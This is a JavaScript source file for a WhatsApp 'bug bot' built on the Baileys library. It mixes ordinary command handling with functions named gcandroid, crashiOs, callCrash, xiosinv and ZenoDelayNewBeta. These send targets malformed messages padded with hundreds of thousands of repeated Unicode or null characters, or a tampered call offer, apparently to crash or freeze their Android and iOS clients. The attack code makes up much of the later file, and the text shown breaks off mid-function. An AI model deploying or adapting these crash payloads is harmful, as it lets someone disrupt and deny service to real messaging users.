const ownerFile = './WhatsApp_DataBase/owner.json'
const premiumFile = './WhatsApp_DataBase/premium.json'
const blocklistFile = './WhatsApp_DataBase/bugblocklist.json'
const developerFile = './WhatsApp_DataBase/developer.json'
const menuImage = 'https://files.catbox.moe/1ze4kn.jpg'
const menuthumb = 'https://files.catbox.moe/1ze4kn.jpg'


process.on('uncaughtException', console.error)
require("./config")
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./WhatsApp_DataBase/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./WhatsApp_DataBase/exif.js')
global.botMode = 'free'
const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const ytdl = require('ytdl-core');
const yts = require('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const { spawn } = require('child_process')
const crypto = require('crypto');
const path = require('path')
const ms = require('ms');
const os = require('os')

module.exports = async (XeonBotInc, m) => {
try {
const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)

const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = sender.split('@')[0]
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";

const isOwner = sender === botNumber
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const pushname = m.pushName || "No Name"
const isBot = botNumber.includes(senderNumber)
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const data = date = dataa = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

const MdBot = require('./Md-BOT')
const LegendBot = require('./legend')
// ===== ROUTE MD-BOT COMMANDS (SAME PREFIX AS MAIN) =====

function getMdCaseNames() {
  try {
    const data = fs.readFileSync('./Md-BOT.js', 'utf8')
    const matches = data.match(/case\s+'([^']+)'/g) || []
    return matches.map(m => m.replace(/case\s+'([^']+)'/, '$1'))
  } catch (e) {
    console.log('MD CASE READ ERROR:', e)
    return []
  }
}

const mdCases = getMdCaseNames()

if (command && mdCases.includes(command)) {
  try {
    await MdBot(XeonBotInc, m)
  } catch (e) {
    console.log('MD-BOT ERROR:', e)
  }
  return
}

function getLegendCaseNames() {
  try {
    const data = fs.readFileSync('./legend.js', 'utf8')
    const matches = data.match(/case\s+'([^']+)'/g) || []
    return matches.map(m => m.replace(/case\s+'([^']+)'/, '$1'))
  } catch (e) {
    console.log('LEGEND CASE READ ERROR:', e)
    return []
  }
}

const LegendCases = getLegendCaseNames()

if (command && LegendCases.includes(command)) {
  try {
    await LegendBot(XeonBotInc, m)
  } catch (e) {
    console.log('LEGEND ERROR:', e)
  }
  return
}

//////💯💯💯💯💯💯💯💯💯💯💯💯💯💯💯
//BLOCKLIST NUMBER FOR BUG
const getOwner = () => JSON.parse(fs.readFileSync(ownerFile))
const getPremium = () => JSON.parse(fs.readFileSync(premiumFile))

const addOwner = (number) => {
  const data = getOwner()
  if (!data.includes(number)) {
    data.push(number)
    fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2))
  }
}

const isPremium = (number) => getPremium().includes(number)

const delOwner = (number) => {
  const data = getOwner().filter(x => x !== number)
  fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2))
}

const addPremium = (number) => {
  const data = getPremium()
  if (!data.includes(number)) {
    data.push(number)
    fs.writeFileSync(premiumFile, JSON.stringify(data, null, 2))
  }
}

const delPremium = (number) => {
  const data = getPremium().filter(x => x !== number)
  fs.writeFileSync(premiumFile, JSON.stringify(data, null, 2))
}

const getDeveloper = () => {
  if (!fs.existsSync(developerFile)) {
    fs.writeFileSync(developerFile, JSON.stringify([], null, 2))
  }
  return JSON.parse(fs.readFileSync(developerFile))
}

const isDeveloper = (number) => {
  return getDeveloper().includes(number)
}

const getBlocklist = () => {
  if (!fs.existsSync(blocklistFile)) {
    fs.writeFileSync(blocklistFile, JSON.stringify([], null, 2))
  }
  return JSON.parse(fs.readFileSync(blocklistFile))
}

const saveBlocklist = (data) => {
  fs.writeFileSync(blocklistFile, JSON.stringify(data, null, 2))
}

const isBlockedTarget = (number) => {
  return getBlocklist().includes(number)
}

global.newsletterJid = "120363420097356422@newsletter"
global.newsletterContext = {
  forwardingScore: 1,
  isForwarded: true,
  forwardedNewsletterMessageInfo: {
    newsletterJid: global.newsletterJid,
    newsletterName: "𝗕𝗔𝗛𝗜𝗥𝗔𝗩𝗔 𝗕𝗨𝗚 𝗕𝗢𝗧",
    serverMessageId: -1
  }
}

 function sendMessageWithMentions2(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363420097356422@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/8nmd6n.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  } else {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363420097356422@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/8nmd6n.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  }
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//group chat msg by xeon
const replygcxeon2 = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363420097356422@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/8nmd6n.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}
}
                        }, {quoted:m})

}

const replygcxeon = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363420097356422@newsletter",
}
}
                        }, {quoted:m})

}
   
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('WhatsApp.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
replygcxeon(response)
}}   


async function gcandroid(victim) {
    try {
        const nulltnt = "ཹ".repeat(65000);
        const repetirNull = nulltnt.repeat(2);

        const message = {
            groupInviteMessage: {
                groupName: repetirNull,
                groupJid: "561611-1627579259@g.us",
                inviteCode: "h+64P9RhJDzgXSPf",
                inviteExpiration: 999,
                caption: "",
                thumbnail: null,
                contextInfo: {}
            },
        };

        await XeonBotInc.relayMessage(victim, message, {});
    } catch (e) {
        console.error("❌ Error sending convite_android:", e);
    }
}



async function crashiOs(XeonBotInc, target) {

  let msg = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await XeonBotInc.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
      
   
}



async function callCrash(target, isVideo = false) {
    const devices = (await XeonBotInc.getUSyncDevices([X], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await XeonBotInc.assertSessions(devices);

    const xnxx = () => {
      const map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => { try { await prev; } catch {} return fn(); })(map[key].task);
          return map[key].task;
        }
      };
    };

const memek = xnxx();
    const bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    const porno = XeonBotInc.createParticipantNodes.bind(XeonBotInc);
    const yntkts = XeonBotInc.encodeWAMessage?.bind(XeonBotInc);

    XeonBotInc.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };


const patched = await (XeonBotInc.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      const ywdh = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      const { id: meId, lid: meLid } = XeonBotInc.authState.creds.me;
      const omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
        const { user: targetUser } = jidDecode(jid);
        const { user: ownPnUser } = jidDecode(meId);
        const isOwnUser = targetUser === ownPnUser || targetUser === omak;
        const y = jid === meId || jid === meLid;
        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

const bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
        return memek.mutex(jid, async () => {
          const { type, ciphertext } = await XeonBotInc.signalRepository.encryptMessage({ jid, data: bytes });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
          return { tag: 'to', attrs: { jid }, content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }] };
        });
      }));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    const awik = crypto.randomBytes(32);
    const awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
    const { nodes: destinations, shouldIncludeDeviceIdentity } = await XeonBotInc.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    const offerContent = [
      { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
      { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
      { tag: "net", attrs: { medium: "3" } },
      { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
      { tag: "encopt", attrs: { keygen: "2" } },
      { tag: "destination", attrs: {}, content: destinations },
      ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(XeonBotInc.authState.creds.account, true) }] : [])
    ];

if (isVideo) offerContent.splice(2, 0, { tag: "video", attrs: { orientation: "0", screen_width: "99999", screen_height: "99999", device_orientation: "0", enc: "vp8", dec: "vp8" } });

    const lemiting = {
      tag: "call",
      attrs: { to: target, id: XeonBotInc.generateMessageTag(), from: XeonBotInc.user.id },
      content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": XeonBotInc.user.id }, content: offerContent }]
    };

    await XeonBotInc.sendNode(lemiting);
    
}

async function xiosinv(target){
tmsg = await generateWAMessageFromContent(target, {
               viewOnceMessage: {
                   message: {
                       listResponseMessage: {
                           title: '@Miiddddoooooooooooo\n',
                           description:"\n\n\n"+"𑪆".repeat(260000),
                           singleSelectReply: {
                               selectedId: "id"
                           },
                           listType: 1
                       }
                   }
               }
       }, {});

       await XeonBotInc.relayMessage("status@broadcast", tmsg.message, {
           messageId: tmsg.key.id,
           statusJidList: [target],
           additionalNodes: [{
               tag: "meta",
               attrs: {},
               content: [{
                   tag: "mentioned_users",
                   attrs: {},
                   content: [{
                       tag: "to",
                       attrs: { jid: target },
                       content: undefined,
                   }],
               }],
           }],
       });
       }

async function ZenoDelayNewBeta(target, ptcp = true) {
  const VariabelJid = "0@s.whatsapp.net";
  const imageMsg = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "99999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
